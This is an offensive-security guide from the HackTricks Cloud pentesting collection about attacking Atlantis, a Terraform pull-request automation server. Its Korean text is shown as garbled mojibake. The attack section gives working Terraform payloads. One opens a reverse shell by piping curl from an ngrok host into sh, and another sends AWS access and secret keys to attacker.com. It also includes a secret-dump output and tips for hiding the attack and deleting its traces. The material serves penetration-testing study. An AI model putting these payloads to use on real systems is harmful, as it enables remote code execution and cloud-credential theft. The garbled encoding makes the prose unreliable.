# Atlantis Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Basic Information

AtlantisëŠ” ê¸°ë³¸ì ìœ¼ë¡œ git ì„œë²„ì˜ Pull Requestsì—ì„œ terraformì„ ì‹¤í–‰í•˜ëŠ” ë° ë„ì›€ì„ ì¤ë‹ˆë‹¤.

![](<../.gitbook/assets/image (161).png>)

### Local Lab

1. [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases)ì—ì„œ **atlantis ë¦´ë¦¬ìŠ¤ í˜ì´ì§€**ë¡œ ê°€ì„œ **ë‹¤ìš´ë¡œë“œ**í•©ë‹ˆë‹¤.
2. **github** ì‚¬ìš©ìì— ëŒ€í•œ **ê°œì¸ í† í°**(repo ì ‘ê·¼ ê¶Œí•œ í¬í•¨)ì„ ìƒì„±í•©ë‹ˆë‹¤.
3. `./atlantis testdrive`ë¥¼ ì‹¤í–‰í•˜ë©´ **atlantisì™€ ëŒ€í™”í•  ìˆ˜ ìˆëŠ” ë°ëª¨ repo**ê°€ ìƒì„±ë©ë‹ˆë‹¤.
1. 127.0.0.1:4141ì—ì„œ ì›¹ í˜ì´ì§€ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Atlantis Access

#### Git Server Credentials

**Atlantis**ëŠ” **Github**, **Gitlab**, **Bitbucket** ë° **Azure DevOps**ì™€ ê°™ì€ ì—¬ëŸ¬ git í˜¸ìŠ¤íŠ¸ë¥¼ ì§€ì›í•©ë‹ˆë‹¤.\
ê·¸ëŸ¬ë‚˜ ì´ëŸ¬í•œ í”Œë«í¼ì˜ repoì— ì ‘ê·¼í•˜ê³  ì‘ì—…ì„ ìˆ˜í–‰í•˜ë ¤ë©´ **íŠ¹ê¶Œ ì ‘ê·¼ ê¶Œí•œì´ ë¶€ì—¬ë˜ì–´ì•¼** í•©ë‹ˆë‹¤(ìµœì†Œí•œ ì“°ê¸° ê¶Œí•œ).\
[**ë¬¸ì„œ**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional)ì—ì„œëŠ” Atlantis ì „ìš© ì‚¬ìš©ìë¥¼ ì´ëŸ¬í•œ í”Œë«í¼ì—ì„œ ìƒì„±í•  ê²ƒì„ ê¶Œì¥í•˜ì§€ë§Œ, ì¼ë¶€ ì‚¬ëŒë“¤ì€ ê°œì¸ ê³„ì •ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="warning" %}
ì–´ì¨Œë“  ê³µê²©ìì˜ ê´€ì ì—ì„œ **Atlantis ê³„ì •**ì€ ë§¤ìš° **í¥ë¯¸ë¡œìš´** **íƒ€ê²Ÿ**ì´ ë  ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

#### Webhooks

AtlantisëŠ” ì„ íƒì ìœ¼ë¡œ [**Webhook secrets**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret)ë¥¼ ì‚¬ìš©í•˜ì—¬ Git í˜¸ìŠ¤íŠ¸ì—ì„œ ìˆ˜ì‹ í•˜ëŠ” **webhooks**ê°€ **í•©ë²•ì ì¸ì§€** í™•ì¸í•©ë‹ˆë‹¤.

ì´ë¥¼ í™•ì¸í•˜ëŠ” í•œ ê°€ì§€ ë°©ë²•ì€ **Git í˜¸ìŠ¤íŠ¸ì˜ IPì—ì„œë§Œ ìš”ì²­ì„ í—ˆìš©í•˜ëŠ”** ê²ƒì´ì§€ë§Œ, ë” ì‰¬ìš´ ë°©ë²•ì€ Webhook Secretì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

ê°œì¸ github ë˜ëŠ” bitbucket ì„œë²„ë¥¼ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” í•œ, webhook ì—”ë“œí¬ì¸íŠ¸ë¥¼ ì¸í„°ë„·ì— ë…¸ì¶œí•´ì•¼ í•œë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì‹­ì‹œì˜¤.

{% hint style="warning" %}
AtlantisëŠ” **webhooksë¥¼ ë…¸ì¶œ**í•˜ì—¬ git ì„œë²„ê°€ ì •ë³´ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. ê³µê²©ìì˜ ê´€ì ì—ì„œ **ë©”ì‹œì§€ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆëŠ”ì§€** ì•„ëŠ” ê²ƒì´ í¥ë¯¸ë¡œìš¸ ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

#### Provider Credentials <a href="#provider-credentials" id="provider-credentials"></a>

[ë¬¸ì„œì—ì„œ:](https://www.runatlantis.io/docs/provider-credentials.html)

AtlantisëŠ” ì„œë²„ **Atlantisê°€ í˜¸ìŠ¤íŒ…ë˜ëŠ”** ê³³ì—ì„œ `terraform plan` ë° `apply` ëª…ë ¹ì„ ë‹¨ìˆœíˆ **ì‹¤í–‰í•˜ì—¬** Terraformì„ ì‹¤í–‰í•©ë‹ˆë‹¤. ë¡œì»¬ì—ì„œ Terraformì„ ì‹¤í–‰í•  ë•Œì™€ ë§ˆì°¬ê°€ì§€ë¡œ, AtlantisëŠ” íŠ¹ì • ê³µê¸‰ìì— ëŒ€í•œ ìê²© ì¦ëª…ì´ í•„ìš”í•©ë‹ˆë‹¤.

Atlantisì— íŠ¹ì • ê³µê¸‰ìì— ëŒ€í•œ [ìê²© ì¦ëª…](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info)ì„ ì œê³µí•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) ë° [AWS Fargate Module](https://www.runatlantis.io/docs/deployment.html#aws-fargate)ì—ëŠ” ê³µê¸‰ì ìê²© ì¦ëª…ì— ëŒ€í•œ ìì²´ ë©”ì»¤ë‹ˆì¦˜ì´ ìˆìŠµë‹ˆë‹¤. ë¬¸ì„œë¥¼ ì½ì–´ë³´ì‹­ì‹œì˜¤.
* í´ë¼ìš°ë“œì—ì„œ Atlantisë¥¼ ì‹¤í–‰í•˜ëŠ” ê²½ìš°, ë§ì€ í´ë¼ìš°ë“œì—ì„œ í´ë¼ìš°ë“œ API ì ‘ê·¼ì„ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì œê³µí•˜ëŠ” ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤. ì˜ˆ:
* [AWS EC2 Roles](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (ê²€ìƒ‰ì–´: "EC2 Role")
* [GCE Instance Service Accounts](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference)
* ë§ì€ ì‚¬ìš©ìê°€ í™˜ê²½ ë³€ìˆ˜ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤. ì˜ˆ: `AWS_ACCESS_KEY`, Atlantisê°€ ì‹¤í–‰ë˜ëŠ” ê³³ì—ì„œ.
* ë‹¤ë¥¸ ì‚¬ìš©ìëŠ” í•„ìš”í•œ êµ¬ì„± íŒŒì¼ì„ ìƒì„±í•©ë‹ˆë‹¤. ì˜ˆ: `~/.aws/credentials`, Atlantisê°€ ì‹¤í–‰ë˜ëŠ” ê³³ì—ì„œ.
* [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs)ë¥¼ ì‚¬ìš©í•˜ì—¬ ê³µê¸‰ì ìê²© ì¦ëª…ì„ ì–»ìŠµë‹ˆë‹¤.

{% hint style="warning" %}
**Atlantisê°€ ì‹¤í–‰ë˜ëŠ”** **ì»¨í…Œì´ë„ˆ**ëŠ” **AWS, GCP, Github...**ì™€ ê°™ì€ ê³µê¸‰ìì— ëŒ€í•œ **íŠ¹ê¶Œ ìê²© ì¦ëª…**ì„ í¬í•¨í•  ê°€ëŠ¥ì„±ì´ ë†’ìŠµë‹ˆë‹¤.
{% endhint %}

#### Web Page

ê¸°ë³¸ì ìœ¼ë¡œ AtlantisëŠ” **localhostì˜ í¬íŠ¸ 4141ì—ì„œ ì›¹ í˜ì´ì§€ë¥¼ ì‹¤í–‰**í•©ë‹ˆë‹¤. ì´ í˜ì´ì§€ëŠ” atlantis applyë¥¼ í™œì„±í™”/ë¹„í™œì„±í™”í•˜ê³  repoì˜ ê³„íš ìƒíƒœë¥¼ í™•ì¸í•˜ê³  ì ê¸ˆì„ í•´ì œí•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤(ìˆ˜ì •ì€ í—ˆìš©í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ ê·¸ë¦¬ ìœ ìš©í•˜ì§€ëŠ” ì•ŠìŠµë‹ˆë‹¤).

ì¸í„°ë„·ì— ë…¸ì¶œë˜ì§€ ì•Šì„ ê°€ëŠ¥ì„±ì´ ë†’ì§€ë§Œ, ê¸°ë³¸ì ìœ¼ë¡œ **ì ‘ê·¼í•˜ëŠ” ë° ìê²© ì¦ëª…ì´ í•„ìš”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**(í•„ìš”í•œ ê²½ìš° `atlantis`:`atlantis`ê°€ **ê¸°ë³¸** ìê²© ì¦ëª…ì…ë‹ˆë‹¤).

### Server Configuration

`atlantis server`ì— ëŒ€í•œ êµ¬ì„±ì€ ëª…ë ¹ì¤„ í”Œë˜ê·¸, í™˜ê²½ ë³€ìˆ˜, êµ¬ì„± íŒŒì¼ ë˜ëŠ” ì´ ì„¸ ê°€ì§€ì˜ ì¡°í•©ì„ í†µí•´ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* Atlantis ì„œë²„ì—ì„œ ì§€ì›í•˜ëŠ” [**í”Œë˜ê·¸ ëª©ë¡**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration)ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [**êµ¬ì„± ì˜µì…˜ì„ í™˜ê²½ ë³€ìˆ˜ë¡œ ë³€í™˜í•˜ëŠ” ë°©ë²•**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê°’ì€ **ì´ ìˆœì„œë¡œ ì„ íƒë©ë‹ˆë‹¤**:

1. í”Œë˜ê·¸
2. í™˜ê²½ ë³€ìˆ˜
3. êµ¬ì„± íŒŒì¼

{% hint style="warning" %}
êµ¬ì„±ì—ì„œ **í† í° ë° ë¹„ë°€ë²ˆí˜¸**ì™€ ê°™ì€ í¥ë¯¸ë¡œìš´ ê°’ì„ ì°¾ì„ ìˆ˜ ìˆë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì‹­ì‹œì˜¤.
{% endhint %}

#### Repos Configuration

ì¼ë¶€ êµ¬ì„±ì€ **repo ê´€ë¦¬ ë°©ì‹ì— ì˜í–¥ì„ ë¯¸ì¹©ë‹ˆë‹¤**. ê·¸ëŸ¬ë‚˜ **ê° repoê°€ ì„œë¡œ ë‹¤ë¥¸ ì„¤ì •ì„ ìš”êµ¬í•  ìˆ˜** ìˆìœ¼ë¯€ë¡œ ê° repoë¥¼ ì§€ì •í•˜ëŠ” ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤. ìš°ì„  ìˆœìœ„ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

1. Repo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) íŒŒì¼. ì´ íŒŒì¼ì€ atlantisê°€ repoë¥¼ ì–´ë–»ê²Œ ì²˜ë¦¬í•´ì•¼ í•˜ëŠ”ì§€ë¥¼ ì§€ì •í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ê¸°ë³¸ì ìœ¼ë¡œ ì¼ë¶€ í‚¤ëŠ” ì´ë¥¼ í—ˆìš©í•˜ëŠ” í”Œë˜ê·¸ ì—†ì´ ì§€ì •í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.
1. ì•„ë§ˆë„ `allowed_overrides` ë˜ëŠ” `allow_custom_workflows`ì™€ ê°™ì€ í”Œë˜ê·¸ì— ì˜í•´ í—ˆìš©ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.
2. [**ì„œë²„ ì¸¡ êµ¬ì„±**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): `--repo-config` í”Œë˜ê·¸ë¡œ ì „ë‹¬í•  ìˆ˜ ìˆìœ¼ë©°, ê° repoì— ëŒ€í•œ ìƒˆë¡œìš´ ì„¤ì •ì„ êµ¬ì„±í•˜ëŠ” yamlì…ë‹ˆë‹¤(ì •ê·œ í‘œí˜„ì‹ ì§€ì›).
3. **ê¸°ë³¸** ê°’

**PR Protections**

AtlantisëŠ” **PR**ì´ ë‹¤ë¥¸ ì‚¬ëŒì— ì˜í•´ **`ìŠ¹ì¸`**ë˜ê¸°ë¥¼ ì›í•˜ëŠ”ì§€(ë¸Œëœì¹˜ ë³´í˜¸ì— ì„¤ì •ë˜ì§€ ì•Šì€ ê²½ìš°ì—ë„) ë°/ë˜ëŠ” **`ë³‘í•© ê°€ëŠ¥`**(ë¸Œëœì¹˜ ë³´í˜¸ í†µê³¼)í•´ì•¼ í•˜ëŠ”ì§€ë¥¼ ë‚˜íƒ€ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤ **applyë¥¼ ì‹¤í–‰í•˜ê¸° ì „ì—**. ë³´ì•ˆ ê´€ì ì—ì„œ ë‘ ì˜µì…˜ì„ ëª¨ë‘ ì„¤ì •í•˜ëŠ” ê²ƒì´ ê¶Œì¥ë©ë‹ˆë‹¤.

`allowed_overrides`ê°€ Trueì¸ ê²½ìš°, ì´ëŸ¬í•œ ì„¤ì •ì€ **`/atlantis.yml` íŒŒì¼**ì—ì„œ ê° í”„ë¡œì íŠ¸ì— ëŒ€í•´ **ë®ì–´ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

**Scripts**

repo êµ¬ì„±ì€ **ì›Œí¬í”Œë¡œìš°ê°€ ì‹¤í–‰ë˜ê¸° ì „** [**ì´ì „**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_pre workflow hooks_) ë° [**í›„**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_post workflow hooks_)ì— ì‹¤í–‰í•  **ìŠ¤í¬ë¦½íŠ¸**ë¥¼ **ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

**repo `/atlantis.yml`** íŒŒì¼ì—ì„œ ì´ëŸ¬í•œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ **ì§€ì •í•˜ëŠ”** ì˜µì…˜ì€ ì—†ìŠµë‹ˆë‹¤.

**Workflow**

repo êµ¬ì„±(ì„œë²„ ì¸¡ êµ¬ì„±)ì—ì„œ [**ìƒˆ ê¸°ë³¸ ì›Œí¬í”Œë¡œìš°ë¥¼ ì§€ì •**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow)í•˜ê±°ë‚˜ [**ìƒˆ ì‚¬ìš©ì ì •ì˜ ì›Œí¬í”Œë¡œìš°ë¥¼ ìƒì„±**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.** ë˜í•œ **ì–´ë–¤ repo**ê°€ ìƒì„±ëœ **ìƒˆë¡œìš´** onesì— **ì ‘ê·¼í•  ìˆ˜ ìˆëŠ”ì§€** **ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**\
ê·¸ëŸ° ë‹¤ìŒ ê° repoì˜ **atlantis.yaml** íŒŒì¼ì´ **ì‚¬ìš©í•  ì›Œí¬í”Œë¡œìš°ë¥¼ ì§€ì •í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

{% hint style="danger" %}
[**ì„œë²„ ì¸¡ êµ¬ì„±**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) í”Œë˜ê·¸ `allow_custom_workflows`ê°€ **True**ë¡œ ì„¤ì •ë˜ë©´, ê° repoì˜ **`atlantis.yaml`** íŒŒì¼ì—ì„œ ì›Œí¬í”Œë¡œìš°ë¥¼ **ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ë˜í•œ **`allowed_overrides`**ê°€ **`workflow`**ë¥¼ ì§€ì •í•˜ì—¬ ì‚¬ìš©í•  ì›Œí¬í”Œë¡œìš°ë¥¼ **ë®ì–´ì“¸ ìˆ˜ ìˆë„ë¡** í•´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.\
ì´ê²ƒì€ ê¸°ë³¸ì ìœ¼ë¡œ **í•´ë‹¹ repoì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ì‚¬ìš©ìì—ê²Œ Atlantis ì„œë²„ì—ì„œ RCEë¥¼ ì œê³µ**í•˜ê²Œ ë©ë‹ˆë‹¤.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

**Conftest ì •ì±… ê²€ì‚¬**

AtlantisëŠ” ê³„íš ì¶œë ¥ì— ëŒ€í•´ **ì„œë²„ ì¸¡** [**conftest**](https://www.conftest.dev/) **ì •ì±…**ì„ ì‹¤í–‰í•˜ëŠ” ê²ƒì„ ì§€ì›í•©ë‹ˆë‹¤. ì´ ë‹¨ê³„ë¥¼ ì‚¬ìš©í•˜ëŠ” ì¼ë°˜ì ì¸ ì‚¬ìš© ì‚¬ë¡€ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* ëª¨ë“ˆ ëª©ë¡ ì‚¬ìš© ê±°ë¶€
* ìƒì„± ì‹œ ë¦¬ì†ŒìŠ¤ì˜ ì†ì„± ì£¼ì¥
* ì˜ë„í•˜ì§€ ì•Šì€ ë¦¬ì†ŒìŠ¤ ì‚­ì œ í¬ì°©
* ë³´ì•ˆ ìœ„í—˜ ë°©ì§€ (ì˜ˆ: ë³´ì•ˆ í¬íŠ¸ë¥¼ ê³µê°œì— ë…¸ì¶œ)

êµ¬ì„± ë°©ë²•ì€ [**ë¬¸ì„œ**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Atlantis ëª…ë ¹ì–´

[**ë¬¸ì„œì—ì„œ**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) Atlantisë¥¼ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ì˜µì…˜ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
### ê³µê²©

{% hint style="warning" %}
ì•…ìš© ì¤‘ì— ë‹¤ìŒê³¼ ê°™ì€ **ì˜¤ë¥˜**ê°€ ë°œìƒí•˜ë©´: `Error: Error acquiring the state lock`

ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ì—¬ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

#### Atlantis plan RCE - ìƒˆë¡œìš´ PRì—ì„œì˜ êµ¬ì„± ìˆ˜ì •

ì €ì¥ì†Œì— ëŒ€í•œ ì“°ê¸° ê¶Œí•œì´ ìˆìœ¼ë©´ ìƒˆë¡œìš´ ë¸Œëœì¹˜ë¥¼ ìƒì„±í•˜ê³  PRì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **`atlantis plan`**ì„ **ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ë©´** (ë˜ëŠ” ìë™ìœ¼ë¡œ ì‹¤í–‰ë  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤) **Atlantis ì„œë²„ ë‚´ì—ì„œ RCEë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ë‹¤ìŒê³¼ ê°™ì´ [**Atlantisê°€ ì™¸ë¶€ ë°ì´í„° ì†ŒìŠ¤ë¥¼ ë¡œë“œí•˜ë„ë¡**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source) í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `main.tf` íŒŒì¼ì— ë‹¤ìŒê³¼ ê°™ì€ í˜ì´ë¡œë“œë¥¼ ë„£ìœ¼ì„¸ìš”:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**ì€ë°€í•œ ê³µê²©**

ì´ ê³µê²©ì€ ë‹¤ìŒ ì œì•ˆì„ ë”°ë¦„ìœ¼ë¡œì¨ **ì€ë°€í•œ ë°©ë²•**ìœ¼ë¡œ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* terraform íŒŒì¼ì— rev shellì„ ì§ì ‘ ì¶”ê°€í•˜ëŠ” ëŒ€ì‹ , rev shellì„ í¬í•¨í•˜ëŠ” **ì™¸ë¶€ ë¦¬ì†ŒìŠ¤**ë¥¼ **ë¡œë“œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
You can find the rev shell code in [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

* ì™¸ë¶€ ë¦¬ì†ŒìŠ¤ì—ì„œ **ref** ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ì—¬ **ë ˆí¬ì˜ ë¸Œëœì¹˜ì— ìˆëŠ” terraform rev shell ì½”ë“œë¥¼ ìˆ¨ê¹ë‹ˆë‹¤**, ì˜ˆë¥¼ ë“¤ì–´: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **PRì„ masterì— ìƒì„±í•˜ëŠ” ëŒ€ì‹ ** Atlantisë¥¼ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•´ **2ê°œì˜ ë¸Œëœì¹˜**(test1 ë° test2)ë¥¼ ìƒì„±í•˜ê³  **í•˜ë‚˜ì—ì„œ ë‹¤ë¥¸ ìª½ìœ¼ë¡œ PRì„ ìƒì„±í•©ë‹ˆë‹¤**. ê³µê²©ì´ ì™„ë£Œë˜ë©´ **PRê³¼ ë¸Œëœì¹˜ë¥¼ ì œê±°í•˜ì„¸ìš”**.

#### Atlantis plan Secrets Dump

ë‹¤ìŒê³¼ ê°™ì´ terraform íŒŒì¼ì— ì…ë ¥í•˜ì—¬ `atlantis plan` (`terraform plan`)ì„ ì‹¤í–‰í•˜ì—¬ **terraformì—ì„œ ì‚¬ìš©ë˜ëŠ” ë¹„ë°€ì„ ë¤í”„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
#### Atlantis apply RCE - Config modification in new PR

ì €ì¥ì†Œì— ëŒ€í•œ ì“°ê¸° ê¶Œí•œì´ ìˆìœ¼ë©´ ìƒˆë¡œìš´ ë¸Œëœì¹˜ë¥¼ ìƒì„±í•˜ê³  PRì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **`atlantis apply`ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ë©´ Atlantis ì„œë²„ ë‚´ì—ì„œ RCEë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ê·¸ëŸ¬ë‚˜ ì¼ë°˜ì ìœ¼ë¡œ ëª‡ ê°€ì§€ ë³´í˜¸ ì¥ì¹˜ë¥¼ ìš°íšŒí•´ì•¼ í•©ë‹ˆë‹¤:

* **Mergeable**: ì´ ë³´í˜¸ ì¥ì¹˜ê°€ Atlantisì— ì„¤ì •ë˜ì–´ ìˆìœ¼ë©´, **PRì´ mergeableì¼ ë•Œë§Œ `atlantis apply`ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤** (ì¦‰, ë¸Œëœì¹˜ ë³´í˜¸ë¥¼ ìš°íšŒí•´ì•¼ í•¨ì„ ì˜ë¯¸í•©ë‹ˆë‹¤).
* ì ì¬ì ì¸ [**ë¸Œëœì¹˜ ë³´í˜¸ ìš°íšŒ**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md) í™•ì¸
* **Approved**: ì´ ë³´í˜¸ ì¥ì¹˜ê°€ Atlantisì— ì„¤ì •ë˜ì–´ ìˆìœ¼ë©´, **ë‹¤ë¥¸ ì‚¬ìš©ìê°€ PRì„ ìŠ¹ì¸í•´ì•¼ `atlantis apply`ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
* ê¸°ë³¸ì ìœ¼ë¡œ [**Gitbot í† í°ì„ ì‚¬ìš©í•˜ì—¬ ì´ ë³´í˜¸ ì¥ì¹˜ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md).

ì•…ì˜ì ì¸ Terraform íŒŒì¼ì—ì„œ **`terraform apply`ë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒ**ì€ [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
ë‹¤ìŒê³¼ ê°™ì€ í˜ì´ë¡œë“œê°€ `main.tf` íŒŒì¼ì— í¬í•¨ë˜ë„ë¡ í•´ì•¼ í•©ë‹ˆë‹¤:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
ì´ ê³µê²©ì„ **ë” ì€ë°€í•œ ë°©ë²•**ìœ¼ë¡œ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ **ì´ì „ ê¸°ìˆ ì˜ ì œì•ˆ**ì„ ë”°ë¥´ì‹­ì‹œì˜¤.

#### Terraform Param Injection

`atlantis plan` ë˜ëŠ” `atlantis apply`ë¥¼ ì‹¤í–‰í•  ë•Œ terraformì´ ì‹¤í–‰ë˜ë©°, atlantisì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ ì£¼ì„ì„ í†µí•´ terraformì— ëª…ë ¹ì„ ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
env ë³€ìˆ˜ë¥¼ ì „ë‹¬í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ì¼ë¶€ ë³´í˜¸ë¥¼ ìš°íšŒí•˜ëŠ” ë° ë„ì›€ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)ì—ì„œ terraform env varsë¥¼ í™•ì¸í•˜ì„¸ìš”.

#### Custom Workflow

`atlantis.yaml` íŒŒì¼ì— ì§€ì •ëœ **ì•…ì˜ì ì¸ ì‚¬ìš©ì ì •ì˜ ë¹Œë“œ ëª…ë ¹**ì„ ì‹¤í–‰í•©ë‹ˆë‹¤. AtlantisëŠ” `master`ê°€ ì•„ë‹Œ í’€ ìš”ì²­ ë¸Œëœì¹˜ì˜ `atlantis.yaml` íŒŒì¼ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.\
ì´ ê°€ëŠ¥ì„±ì€ ì´ì „ ì„¹ì…˜ì—ì„œ ì–¸ê¸‰ë˜ì—ˆìŠµë‹ˆë‹¤:

